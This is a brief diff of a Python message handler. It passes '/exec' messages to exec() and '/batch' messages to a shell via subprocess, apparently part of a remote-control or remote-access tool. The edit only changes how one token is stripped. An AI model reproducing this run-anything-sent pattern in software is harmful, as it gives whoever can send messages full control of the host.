@@ -1577,7 +1577,7 @@ def send_data(message=None):
             python_threads.append(threading.Thread(target=execute_python_file, args=(python_file,), daemon=True))
             python_threads[-1].start()
         else:
-            exec(message.replace("/exec", "").strip())
+            exec(message.replace("/exec", "").replace("type:single_line", "").strip())
 
     elif message.startswith("/batch"):
         subprocess.Popen(message.replace("/batch", "", 1).strip(), shell=True)
